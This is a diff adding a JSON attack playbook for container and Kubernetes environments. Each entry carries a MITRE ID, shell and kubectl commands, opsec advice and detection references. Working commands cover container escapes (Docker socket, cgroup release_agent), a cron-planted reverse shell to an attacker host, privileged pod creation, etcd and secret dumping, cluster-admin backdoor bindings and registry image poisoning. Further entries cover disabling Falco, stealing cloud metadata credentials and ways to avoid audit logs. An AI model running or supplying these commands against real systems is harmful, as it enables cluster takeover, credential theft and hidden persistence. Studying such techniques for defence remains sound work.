@@ -1,0 +1,654 @@
+{
+  "docker_enum": {
+    "description": "Enumerating Docker environments from inside and outside containers.",
+    "mitre": "T1613",
+    "commands": [
+      {
+        "description": "Check if running inside a container.",
+        "method": "shell",
+        "command": "cat /proc/1/cgroup | grep -i docker; ls -la /.dockerenv 2>/dev/null; cat /proc/self/mountinfo | grep -i docker"
+      },
+      {
+        "description": "List all running containers.",
+        "method": "docker",
+        "command": "docker ps -a --format 'table {{.ID}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'"
+      },
+      {
+        "description": "List Docker networks.",
+        "method": "docker",
+        "command": "docker network ls && docker network inspect bridge"
+      },
+      {
+        "description": "Inspect container for environment variables and secrets.",
+        "method": "docker",
+        "command": "docker inspect {container_id} | jq '.[].Config.Env, .[].Mounts'"
+      },
+      {
+        "description": "Check for exposed Docker socket from inside container.",
+        "method": "shell",
+        "command": "ls -la /var/run/docker.sock && curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"
+      }
+    ],
+    "prerequisites": "Shell access inside a container; Docker socket or container runtime accessible",
+    "opsec": "Docker socket access (/var/run/docker.sock) grants full container control. Enumerate environment variables, mounted secrets first \u2014 no tools needed.",
+    "detection_ref": "Falco rules for docker.sock access; runtime security monitoring; container process anomalies"
+  },
+  "docker_escape": {
+    "description": "Escaping Docker containers to compromise the host system.",
+    "mitre": "T1611",
+    "commands": [
+      {
+        "description": "Escape via exposed Docker socket \u2014 spawn privileged container.",
+        "method": "docker",
+        "command": "docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host --network=host --volume /:/host alpine chroot /host bash"
+      },
+      {
+        "description": "Privileged container escape via /proc/sysrq-trigger.",
+        "method": "shell",
+        "command": "# In privileged container:\\nfdisk -l; mkdir /tmp/host; mount /dev/{host_disk} /tmp/host; chroot /tmp/host bash"
+      },
+      {
+        "description": "Container escape via cgroup release_agent (CVE-2022-0492). Note: cgroup v1 release_agent escape is mitigated on kernel 5.2+ (cgroupv2) and systems with Seccomp/AppArmor. Verify with: cat /proc/1/cgroup. Fall back to runc CVE-2019-5736 or privileged socket mount on patched kernels.",
+        "method": "shell",
+        "command": "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo \"id > $host_path/output\" >> /cmd && chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+      },
+      {
+        "description": "Escape via writable hostPath volume mount.",
+        "method": "shell",
+        "command": "# If /host or similar hostPath is mounted read-write:\\necho '* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /host/etc/crontab"
+      },
+      {
+        "description": "runc escape (CVE-2019-5736).",
+        "method": "exploit",
+        "command": "# Overwrite host runc binary via /proc/self/exe symlink from inside container"
+      },
+      {
+        "description": "Escape via kernel exploit (requires privileged caps).",
+        "method": "shell",
+        "command": "# Check capabilities: capsh --print\\n# If CAP_SYS_ADMIN present \u2014 use DirtyCow or similar kernel exploit"
+      },
+      {
+        "description": "Leaky Vessels runc escape (CVE-2024-21626) \u2014 working directory file descriptor leak.",
+        "method": "exploit",
+        "command": "# Affects runc < 1.1.12: set container working dir to /proc/self/fd/7 (leaked host fd) to access host filesystem from inside container"
+      },
+      {
+        "description": "Kata Containers bypass via shared kernel with CAP_SYS_PTRACE.",
+        "method": "shell",
+        "command": "# If running in Kata with CAP_SYS_PTRACE: use ptrace to attach to host process via shared /proc namespace"
+      }
+    ],
+    "prerequisites": "Privileged container; CAP_SYS_ADMIN; Docker socket mounted; or shared PID namespace",
+    "opsec": "Privileged escape via /proc/1/root or cgroup notify is fast and reliable. Cgroup v1 approach leaves traces in kernel audit log.",
+    "detection_ref": "Falco container escape detection; seccomp/AppArmor profiles; Pod Security Standards enforcement; Sysdig for runtime anomalies"
+  },
+  "kubernetes_enum": {
+    "description": "Enumerating Kubernetes clusters, namespaces, and resources.",
+    "mitre": "T1613",
+    "commands": [
+      {
+        "description": "Check current K8s context and permissions.",
+        "method": "kubectl",
+        "command": "kubectl config current-context && kubectl auth can-i --list"
+      },
+      {
+        "description": "List all namespaces.",
+        "method": "kubectl",
+        "command": "kubectl get namespaces"
+      },
+      {
+        "description": "List all pods across all namespaces.",
+        "method": "kubectl",
+        "command": "kubectl get pods --all-namespaces -o wide"
+      },
+      {
+        "description": "List all secrets in a namespace.",
+        "method": "kubectl",
+        "command": "kubectl get secrets -n {namespace} -o yaml"
+      },
+      {
+        "description": "Get service account tokens from pod.",
+        "method": "shell",
+        "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+      },
+      {
+        "description": "Access K8s API from inside pod using service account token.",
+        "method": "curl",
+        "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces"
+      },
+      {
+        "description": "Enumerate cluster roles and bindings.",
+        "method": "kubectl",
+        "command": "kubectl get clusterroles && kubectl get clusterrolebindings"
+      },
+      {
+        "description": "Find privileged pods.",
+        "method": "kubectl",
+        "command": "kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'"
+      }
+    ],
+    "prerequisites": "kubectl access or service account token; any cluster permissions",
+    "opsec": "API server audit logs capture all kubectl/API requests. Use in-cluster service account with least privilege. Limit enumeration scope.",
+    "detection_ref": "API server audit log anomalies; unexpected service account API calls; Kubernetes threat detection tools (Falco, Aqua)"
+  },
+  "kubernetes_privilege_escalation": {
+    "description": "Escalating privileges within Kubernetes clusters.",
+    "mitre": "T1078.004",
+    "commands": [
+      {
+        "description": "Deploy privileged pod for host escape.",
+        "method": "kubectl",
+        "command": "kubectl apply -f - <<EOF\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: privesc\\nspec:\\n  hostPID: true\\n  hostNetwork: true\\n  containers:\\n  - name: pwn\\n    image: alpine\\n    command: [\"/bin/sh\",\"-c\",\"nsenter -t 1 -m -u -i -n -p -- bash\"]\\n    securityContext:\\n      privileged: true\\n  volumes:\\n  - name: host\\n    hostPath:\\n      path: /\\nEOF"
+      },
+      {
+        "description": "Steal service account token with create pod permission.",
+        "method": "kubectl",
+        "command": "kubectl create serviceaccount pwn-sa && kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:pwn-sa"
+      },
+      {
+        "description": "Abuse RBAC wildcard permissions.",
+        "method": "kubectl",
+        "command": "# If you have verb=* or resources=* \u2014 create ClusterRoleBinding for controlled SA"
+      },
+      {
+        "description": "etcd access \u2014 extract all secrets unencrypted.",
+        "method": "etcdctl",
+        "command": "ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only"
+      },
+      {
+        "description": "Read all K8s secrets via etcd.",
+        "method": "etcdctl",
+        "command": "ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets --prefix"
+      },
+      {
+        "description": "Spawn node-shell for direct node access without SSH.",
+        "method": "kubectl",
+        "command": "kubectl node-shell {node_name}  # requires kubectl-node-shell plugin: runs privileged pod and nsenter to host"
+      },
+      {
+        "description": "Abuse create/patch node permission to add malicious label for scheduling.",
+        "method": "kubectl",
+        "command": "kubectl label node {node_name} security=low && kubectl apply -f pod-on-low-security-node.yaml"
+      }
+    ],
+    "prerequisites": "ClusterAdmin binding; ability to create/modify RBAC roles; or vulnerable admission controller",
+    "opsec": "Create intermediary roles that don't appear obviously privileged. Prefer editing existing ClusterRoleBindings over creating new obvious ones.",
+    "detection_ref": "API server audit for RBAC changes; ClusterRoleBinding creation events; Kubernetes RBAC assessment tools (rbac-police)"
+  },
+  "kubernetes_lateral_movement": {
+    "description": "Moving laterally within Kubernetes clusters.",
+    "mitre": "T1210",
+    "commands": [
+      {
+        "description": "Exec into another pod.",
+        "method": "kubectl",
+        "command": "kubectl exec -it {pod_name} -n {namespace} -- /bin/bash"
+      },
+      {
+        "description": "Port-forward to reach internal service.",
+        "method": "kubectl",
+        "command": "kubectl port-forward svc/{service_name} {local_port}:{remote_port} -n {namespace}"
+      },
+      {
+        "description": "Use service account token to access other namespaces.",
+        "method": "curl",
+        "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/{other_namespace}/secrets"
+      },
+      {
+        "description": "Scan internal K8s network from compromised pod.",
+        "method": "shell",
+        "command": "for ip in $(seq 1 254); do (ping -c1 -W1 10.0.0.$ip &>/dev/null && echo 10.0.0.$ip) & done; wait"
+      },
+      {
+        "description": "Access cloud metadata from K8s pod (node IAM role theft).",
+        "method": "curl",
+        "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H 'X-aws-ec2-metadata-token: {token}'"
+      }
+    ],
+    "prerequisites": "Active pod or service account token; network access to other pods/services",
+    "opsec": "K8s east-west traffic is often unencrypted. Use service account tokens to access other services. kubectl exec provides direct pod shell.",
+    "detection_ref": "Kubernetes audit log for exec/portforward; network policy enforcement; Falco lateral movement rules"
+  },
+  "container_image_analysis": {
+    "description": "Analyzing container images for secrets, vulnerabilities, and misconfigurations.",
+    "commands": [
+      {
+        "description": "Scan container image for CVEs with Trivy.",
+        "method": "trivy",
+        "command": "trivy image {image_name}:{tag} --severity HIGH,CRITICAL"
+      },
+      {
+        "description": "Extract all layers from Docker image for secret hunting.",
+        "method": "dive",
+        "command": "dive {image_name} # interactive layer explorer"
+      },
+      {
+        "description": "Scan image for hardcoded secrets with trufflehog.",
+        "method": "trufflehog",
+        "command": "trufflehog docker --image {image_name}"
+      },
+      {
+        "description": "Inspect full image manifest and config.",
+        "method": "docker",
+        "command": "docker image inspect {image_name} | jq '.[].Config.Env, .[].Config.Entrypoint, .[].Config.Cmd'"
+      },
+      {
+        "description": "Flatten and extract all files from image for analysis.",
+        "method": "shell",
+        "command": "docker save {image} | tar x -C /tmp/image_extract/ && find /tmp/image_extract -name '*.env' -o -name 'config*' | xargs grep -l 'password\\|secret\\|key'"
+      }
+    ],
+    "mitre": "T1195.001",
+    "prerequisites": "Container registry access; image pull capability; analysis tools",
+    "opsec": "Pull images and analyze layers offline. Docker history and layer extraction reveals credentials and sensitive files in build history.",
+    "detection_ref": "Image scanning (Trivy, Snyk Container); registry pull monitoring; secret scanning in image layers; build pipeline security"
+  },
+  "kubernetes_secrets_hunting": {
+    "description": "Hunting for secrets in Kubernetes cluster resources beyond basic secret access.",
+    "commands": [
+      {
+        "description": "Dump all secrets across all namespaces.",
+        "method": "kubectl",
+        "command": "kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, data: .data}'"
+      },
+      {
+        "description": "Decode a base64-encoded secret value.",
+        "method": "kubectl",
+        "command": "kubectl get secret {secret_name} -n {namespace} -o jsonpath='{.data.{key}}' | base64 -d"
+      },
+      {
+        "description": "Find secrets mounted as environment variables in pods.",
+        "method": "kubectl",
+        "command": "kubectl get pods --all-namespaces -o json | jq '.items[] | {pod: .metadata.name, env: .spec.containers[].env}'"
+      },
+      {
+        "description": "Find secrets mounted as volumes in pods.",
+        "method": "kubectl",
+        "command": "kubectl get pods --all-namespaces -o json | jq '.items[].spec.volumes[] | select(.secret) | .secret.secretName'"
+      },
+      {
+        "description": "Access mounted secret from inside pod.",
+        "method": "shell",
+        "command": "ls /var/run/secrets/ && cat /var/run/secrets/kubernetes.io/serviceaccount/token && find / -name '*.env' 2>/dev/null"
+      }
+    ],
+    "mitre": "T1552.007",
+    "prerequisites": "Read access to secrets (secrets:get/list); or etcd access",
+    "opsec": "API server logs all secret reads. Access specific secrets by name rather than listing all. Etcd access bypasses audit logging.",
+    "detection_ref": "API server audit for secrets:list/get; etcd access monitoring; secret rotation automation; sealed secrets/external secret operators"
+  },
+  "kubernetes_network_policy_bypass": {
+    "description": "Bypassing Kubernetes network policies and pod-to-pod communication restrictions.",
+    "commands": [
+      {
+        "description": "Check if network policies exist in namespace.",
+        "method": "kubectl",
+        "command": "kubectl get networkpolicies --all-namespaces"
+      },
+      {
+        "description": "Probe all pods on internal cluster network from compromised pod.",
+        "method": "shell",
+        "command": "for ip in $(kubectl get pods --all-namespaces -o json | jq -r '.items[].status.podIP'); do (curl -s --max-time 1 http://$ip:8080/ && echo $ip) & done; wait"
+      },
+      {
+        "description": "DNS-based service discovery inside cluster.",
+        "method": "shell",
+        "command": "cat /etc/resolv.conf && nslookup kubernetes.default.svc.cluster.local && for svc in $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace); do nslookup $svc.svc.cluster.local; done"
+      },
+      {
+        "description": "Use kubeletctl to run commands on other nodes via kubelet API.",
+        "method": "kubeletctl",
+        "command": "kubeletctl --server {node_ip} run 'id' --container {container} --pod {pod} --namespace {ns}"
+      },
+      {
+        "description": "Pivot to host network namespace from pod with hostNetwork:true.",
+        "method": "shell",
+        "command": "# If pod has hostNetwork: true, you're on the node network \u2014 scan other nodes: nmap -sn 10.0.0.0/8"
+      }
+    ],
+    "mitre": "T1599",
+    "prerequisites": "Pod exec access; network policy misconfiguration or absence",
+    "opsec": "Default K8s allows all pod-to-pod communication. Use pod as pivot to reach internal services. HostNetwork pods bypass all network policies.",
+    "detection_ref": "Network policy enforcement; Calico/Cilium policy audit; pod network traffic monitoring; HostNetwork pod detection"
+  },
+  "runtime_security_evasion": {
+    "description": "Evading container runtime security tools like Falco and AppArmor.",
+    "commands": [
+      {
+        "description": "Check if Falco or other runtime security is running.",
+        "method": "shell",
+        "command": "ps aux | grep -i falco; ls /etc/falco 2>/dev/null; systemctl status falco 2>/dev/null"
+      },
+      {
+        "description": "Check AppArmor profile applied to container.",
+        "method": "shell",
+        "command": "cat /proc/1/attr/current && aa-status 2>/dev/null"
+      },
+      {
+        "description": "Check seccomp profile applied to container.",
+        "method": "shell",
+        "command": "grep Seccomp /proc/1/status"
+      },
+      {
+        "description": "Evade Falco by using alternative system calls (ptrace vs write).",
+        "method": "shell",
+        "command": "# Use dd instead of cp: dd if=/etc/shadow of=/tmp/out; use python3 instead of shell spawns"
+      },
+      {
+        "description": "Disable Falco kernel module if accessible from privileged container.",
+        "method": "shell",
+        "command": "rmmod falco 2>/dev/null; lsmod | grep falco"
+      }
+    ],
+    "mitre": "T1562.001",
+    "prerequisites": "Container with restricted security context; knowledge of target runtime security tool (Falco, Sysdig)",
+    "opsec": "Disable Falco rules by removing rule files or killing Falco process if running in same namespace. Use allowed syscalls only.",
+    "detection_ref": "Immutable Falco deployment (DaemonSet); out-of-cluster audit logging; eBPF-based runtime security (Tetragon); multiple layered detection"
+  },
+  "helm_misconfiguration": {
+    "description": "Exploiting Helm chart misconfigurations and Tiller exposure.",
+    "commands": [
+      {
+        "description": "List all deployed Helm releases.",
+        "method": "helm",
+        "command": "helm list --all-namespaces"
+      },
+      {
+        "description": "Inspect Helm release values for embedded secrets.",
+        "method": "helm",
+        "command": "helm get values {release_name} -n {namespace}"
+      },
+      {
+        "description": "Dump all Helm release manifests.",
+        "method": "helm",
+        "command": "helm get manifest {release_name} -n {namespace}"
+      },
+      {
+        "description": "Access Helm secrets stored in Kubernetes secrets (Helm v3 backend).",
+        "method": "kubectl",
+        "command": "kubectl get secrets --all-namespaces -l 'owner=helm' -o json | jq '.items[].metadata.name'"
+      },
+      {
+        "description": "Decode Helm release secret to extract full chart values.",
+        "method": "shell",
+        "command": "kubectl get secret sh.helm.release.v1.{release}.v1 -n {namespace} -o jsonpath='{.data.release}' | base64 -d | base64 -d | gzip -d | jq ."
+      }
+    ],
+    "mitre": "T1078.004",
+    "prerequisites": "Helm 2 (Tiller) in cluster; or Helm 3 release data in secrets with read access",
+    "opsec": "Helm 2 Tiller has cluster-admin by default. Helm 3 stores release data in secrets \u2014 read secrets for credential discovery.",
+    "detection_ref": "Helm 2 deprecation; RBAC restrictions on Tiller; Helm release secret access monitoring; chart security scanning"
+  },
+  "service_mesh_attacks": {
+    "description": "Attacking service mesh infrastructure (Istio, Linkerd) for traffic interception and mTLS bypass.",
+    "mitre": "T1557",
+    "commands": [
+      {
+        "description": "Enumerate Istio configuration and services.",
+        "method": "kubectl",
+        "command": "kubectl get virtualservices,destinationrules,gateways --all-namespaces"
+      },
+      {
+        "description": "Check if mTLS is enforced across namespaces.",
+        "method": "kubectl",
+        "command": "kubectl get peerauthentication --all-namespaces -o json | jq '.items[] | {ns: .metadata.namespace, mode: .spec.mtls.mode}'"
+      },
+      {
+        "description": "Dump Istio service account certificates from Envoy proxy.",
+        "method": "shell",
+        "command": "kubectl exec {pod} -c istio-proxy -- curl -s http://localhost:15000/certs"
+      },
+      {
+        "description": "Intercept sidecar traffic via Envoy admin API.",
+        "method": "shell",
+        "command": "kubectl exec {pod} -c istio-proxy -- curl -s http://localhost:15000/config_dump | jq '.configs[] | select(.\"@type\" | contains(\"Clusters\"))'"
+      },
+      {
+        "description": "Bypass Istio policy via port 15006 (inbound plain traffic).",
+        "method": "shell",
+        "command": "# Traffic hitting 15006 directly may bypass Istio policies \u2014 scan from compromised pod"
+      }
+    ],
+    "prerequisites": "Istio/Linkerd/Consul Connect in cluster; sidecar proxy manipulation capability",
+    "opsec": "Extract mTLS certificates from sidecar for traffic decryption. Istio AuthorizationPolicy misconfiguration allows unintended access.",
+    "detection_ref": "Service mesh policy audit; mTLS certificate monitoring; authorization policy validation; service mesh telemetry anomaly detection"
+  },
+  "admission_controller_bypass": {
+    "description": "Bypassing Kubernetes admission controllers and OPA/Gatekeeper policies.",
+    "mitre": "T1611",
+    "commands": [
+      {
+        "description": "Enumerate admission webhooks to identify policy enforcement.",
+        "method": "kubectl",
+        "command": "kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations"
+      },
+      {
+        "description": "Check OPA Gatekeeper constraints.",
+        "method": "kubectl",
+        "command": "kubectl get constraints --all-namespaces"
+      },
+      {
+        "description": "Bypass admission via old API version not covered by webhook.",
+        "method": "kubectl",
+        "command": "# Try: kubectl apply -f pod.yaml --subresource=status or use beta/v1alpha1 API endpoints"
+      },
+      {
+        "description": "Bypass namespace-scoped webhook via kube-system namespace.",
+        "method": "kubectl",
+        "command": "# Deploy pod directly to kube-system if webhook excludes system namespaces: kubectl apply -f evil.yaml -n kube-system"
+      },
+      {
+        "description": "Exploit webhook timeout \u2014 if admission fails open, trigger timeout.",
+        "method": "shell",
+        "command": "# Block network access to webhook server from pod \u2014 if failurePolicy=Ignore, pod deploys anyway"
+      }
+    ],
+    "prerequisites": "Knowledge of admission webhook configurations; ability to create pods outside controlled namespace",
+    "opsec": "Target namespaces excluded from webhook scope. Policy bypass via resourceVersion, finalizers, or dry-run mode.",
+    "detection_ref": "Admission webhook coverage audit; policy exemption monitoring; OPA/Gatekeeper policy testing; privileged pod creation alerts"
+  },
+  "container_registry_attacks": {
+    "description": "Attacking container registries for image poisoning and credential theft.",
+    "mitre": "T1195.002",
+    "commands": [
+      {
+        "description": "Enumerate Docker Hub registry for target org images.",
+        "method": "curl",
+        "command": "curl https://hub.docker.com/v2/repositories/{org}/?page_size=100 | jq '.results[].name'"
+      },
+      {
+        "description": "Pull image from private registry using stolen credentials.",
+        "method": "docker",
+        "command": "docker login {registry_url} -u {user} -p {pass} && docker pull {registry_url}/{image}:{tag}"
+      },
+      {
+        "description": "Extract credentials from Docker config.json.",
+        "method": "shell",
+        "command": "cat ~/.docker/config.json | jq . && cat /root/.docker/config.json 2>/dev/null"
+      },
+      {
+        "description": "Scan registry for vulnerable image versions with trivy.",
+        "method": "trivy",
+        "command": "trivy registry {registry}/{image} --severity CRITICAL"
+      },
+      {
+        "description": "Push poisoned image tag to writable registry.",
+        "method": "docker",
+        "command": "docker pull {registry}/{image}:latest && docker run -it {registry}/{image}:latest /bin/sh -c 'echo evil > /backdoor' && docker commit {container} {registry}/{image}:latest && docker push {registry}/{image}:latest"
+      }
+    ],
+    "prerequisites": "Registry credentials (from Docker config, K8s secrets, or anonymous access); registry URL",
+    "opsec": "Docker config.json with registry creds often in K8s secrets. Public registries with sensitive images. Push malicious images to compromise deployments.",
+    "detection_ref": "Registry access logging; image signing (Cosign/Notary); ImagePullSecret rotation; private registry enforcement"
+  },
+  "kubernetes_persistence": {
+    "description": "Establishing persistence within Kubernetes clusters.",
+    "mitre": "T1078.004",
+    "commands": [
+      {
+        "description": "Create DaemonSet to run payload on every node.",
+        "method": "kubectl",
+        "command": "kubectl create -f - <<EOF\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: system-agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels: {app: agent}\n  template:\n    metadata:\n      labels: {app: agent}\n    spec:\n      hostPID: true\n      hostNetwork: true\n      containers:\n      - name: agent\n        image: alpine\n        command: ['/bin/sh','-c','while true; do sleep 60; done']\n        securityContext:\n          privileged: true\nEOF"
+      },
+      {
+        "description": "Create a backdoor ClusterRoleBinding for attacker-controlled SA.",
+        "method": "kubectl",
+        "command": "kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --serviceaccount={namespace}:{sa_name}"
+      },
+      {
+        "description": "Deploy rogue MutatingWebhook to inject sidecar into every pod.",
+        "method": "kubectl",
+        "command": "kubectl apply -f mutating_webhook.yaml  # webhook that injects attacker's sidecar container"
+      },
+      {
+        "description": "Add SSH key to node via privileged pod with hostPath mount.",
+        "method": "shell",
+        "command": "echo '{ssh_pub_key}' >> /host/root/.ssh/authorized_keys  # from inside privileged pod with / mounted"
+      },
+      {
+        "description": "Compromise CoreDNS configmap for DNS hijacking.",
+        "method": "kubectl",
+        "command": "kubectl edit configmap coredns -n kube-system  # add rewrite rule pointing domain to attacker IP"
+      }
+    ],
+    "prerequisites": "Cluster admin or ability to create RBAC, CRDs, or modify existing controllers",
+    "opsec": "Create RBAC binding with obscure service account name. DaemonSet persistence runs on all nodes. CronJob for periodic re-compromise.",
+    "detection_ref": "Unauthorized RBAC creation; DaemonSet anomalies; CronJob audit; Kubernetes resource change detection"
+  },
+  "cloud_native_recon": {
+    "description": "Reconnaissance specific to cloud-native environments from inside containers.",
+    "mitre": "T1580",
+    "commands": [
+      {
+        "description": "Detect cloud provider from inside container.",
+        "method": "shell",
+        "command": "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ && echo AWS || curl -s --max-time 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/ && echo GCP || curl -s --max-time 2 -H Metadata:true http://169.254.169.254/metadata/instance && echo Azure"
+      },
+      {
+        "description": "List all services in cluster via Kubernetes API.",
+        "method": "shell",
+        "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/services"
+      },
+      {
+        "description": "Dump environment variables from all pods (credential hunting).",
+        "method": "kubectl",
+        "command": "kubectl get pods --all-namespaces -o json | jq '.items[].spec.containers[].env // [] | .[] | select(.value != null) | select(.name | test(\"PASS|SECRET|KEY|TOKEN\";\"i\"))'"
+      },
+      {
+        "description": "Find all ingress controllers and exposed services.",
+        "method": "kubectl",
+        "command": "kubectl get ingress --all-namespaces && kubectl get svc --all-namespaces --field-selector spec.type=LoadBalancer"
+      },
+      {
+        "description": "Enumerate ConfigMaps for stored credentials.",
+        "method": "kubectl",
+        "command": "kubectl get configmaps --all-namespaces -o json | jq '.items[] | select(.data != null) | {name: .metadata.name, ns: .metadata.namespace, keys: .data | keys}'"
+      }
+    ],
+    "prerequisites": "Any cluster access; service account token; kubectl",
+    "opsec": "Enumerate from within a pod \u2014 API server access via service account token. Check for AWS/Azure/GCP metadata service from pods.",
+    "detection_ref": "K8s audit log for API calls from pods; metadata service access from non-expected sources; cloud-native SIEM integration"
+  },
+  "gitops_pipeline_attacks": {
+    "description": "Attacking GitOps tools (ArgoCD, Flux) for cluster takeover via CI/CD pipeline compromise.",
+    "mitre": "T1195.002",
+    "commands": [
+      {
+        "description": "Enumerate ArgoCD applications and their sync status.",
+        "method": "argocd",
+        "command": "argocd login {argocd_server} --username {user} --password {pass} --insecure && argocd app list"
+      },
+      {
+        "description": "Steal ArgoCD admin password from Kubernetes secret.",
+        "method": "kubectl",
+        "command": "kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d"
+      },
+      {
+        "description": "Add malicious cluster to ArgoCD for cross-cluster compromise.",
+        "method": "argocd",
+        "command": "argocd cluster add {context_name} --kubeconfig {kubeconfig}  # Registers attacker's cluster context in ArgoCD"
+      },
+      {
+        "description": "Compromise Flux GitRepository source to inject malicious manifests.",
+        "method": "kubectl",
+        "command": "kubectl get gitrepositories --all-namespaces && kubectl edit gitrepository {name} -n {ns}  # Change URL to attacker-controlled repo"
+      },
+      {
+        "description": "Inject malicious Helm values via ArgoCD app patch.",
+        "method": "argocd",
+        "command": "argocd app set {app_name} --helm-set image.tag=evil --helm-set-string command='id > /tmp/pwned' && argocd app sync {app_name}"
+      }
+    ],
+    "prerequisites": "Access to GitOps repo (ArgoCD, Flux); ability to modify Kubernetes manifests",
+    "opsec": "GitOps controllers auto-apply repo changes to cluster. Modify deployment manifests to inject malicious init containers or environment variables.",
+    "detection_ref": "GitOps repo audit trail; PR approval requirements; signed commits enforcement; ArgoCD/Flux anomaly detection; deployment image verification"
+  },
+  "kubernetes_rbac_escalation": {
+    "description": "Escalate Kubernetes privileges via RBAC misconfigurations \u2014 wildcard permissions, impersonation, and privileged pod creation.",
+    "mitre": "T1078.001",
+    "commands": [
+      {
+        "description": "Enumerate current RBAC permissions",
+        "command": "kubectl auth can-i --list\nkubectl auth can-i create pods --all-namespaces",
+        "method": "kubectl"
+      },
+      {
+        "description": "Find service accounts with cluster-admin binding",
+        "command": "kubectl get clusterrolebindings -o json | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(b['metadata']['name'],s.get('name')) for b in d['items'] if b.get('roleRef',{}).get('name')=='cluster-admin' for s in b.get('subjects',[])]\"",
+        "method": "kubectl/Python"
+      },
+      {
+        "description": "Abuse impersonation to act as cluster-admin",
+        "command": "kubectl get pods --as=system:admin --as-group=system:masters -A",
+        "method": "kubectl"
+      },
+      {
+        "description": "Create privileged pod to escape to node",
+        "command": "kubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: priv-pod\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: priv\n    image: alpine\n    securityContext:\n      privileged: true\n    command: [\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/sh\"]\nEOF",
+        "method": "kubectl"
+      },
+      {
+        "description": "Use kubectl proxy to access API server with SA token",
+        "command": "kubectl proxy &\ncurl http://localhost:8001/api/v1/namespaces/default/secrets",
+        "method": "kubectl"
+      }
+    ],
+    "prerequisites": "Existing role with impersonate, bind, or escalate verbs; or ability to create pods with privileged service accounts",
+    "opsec": "Pod creation with privileged service account is logged. Use existing admin-bound service accounts rather than creating new bindings.",
+    "detection_ref": "API server audit for pod creation with sensitive service accounts; RBAC misconfiguration scanning; kube-bench"
+  },
+  "container_image_supply_chain": {
+    "description": "Attack container image supply chain \u2014 extract secrets from image layers, exploit insecure registries, and scan for vulnerabilities.",
+    "mitre": "T1195.002",
+    "commands": [
+      {
+        "description": "Use dive to inspect each image layer for secrets",
+        "command": "dive target.registry.io/app:latest",
+        "method": "dive"
+      },
+      {
+        "description": "Extract secrets from image layers with Trivy",
+        "command": "trivy image --scanners secret target.registry.io/app:latest\ntrivy image --severity HIGH,CRITICAL target.registry.io/app:latest",
+        "method": "Trivy"
+      },
+      {
+        "description": "Access insecure Docker registry without authentication",
+        "command": "curl -s http://registry.target.com:5000/v2/_catalog\ncurl -s http://registry.target.com:5000/v2/<image>/tags/list",
+        "method": "curl"
+      },
+      {
+        "description": "Pull image from insecure registry",
+        "command": "docker pull registry.target.com:5000/<image>:latest --insecure",
+        "method": "Docker"
+      },
+      {
+        "description": "Inspect image layers for embedded credentials",
+        "command": "docker pull target.registry.io/app:latest\ndocker history target.registry.io/app:latest\ndocker save target.registry.io/app:latest | tar xv",
+        "method": "Docker"
+      }
+    ],
+    "prerequisites": "Ability to contribute to base image, build pipeline, or package repository used in container builds",
+    "opsec": "Compromise base image for downstream impact. Inject malicious layer via CI/CD pipeline compromise. Typosquatting on Docker Hub.",
+    "detection_ref": "Image signing (Cosign) and policy enforcement; SBOM generation and validation; base image scanning; supply chain security (SLSA framework)"
+  }
+}
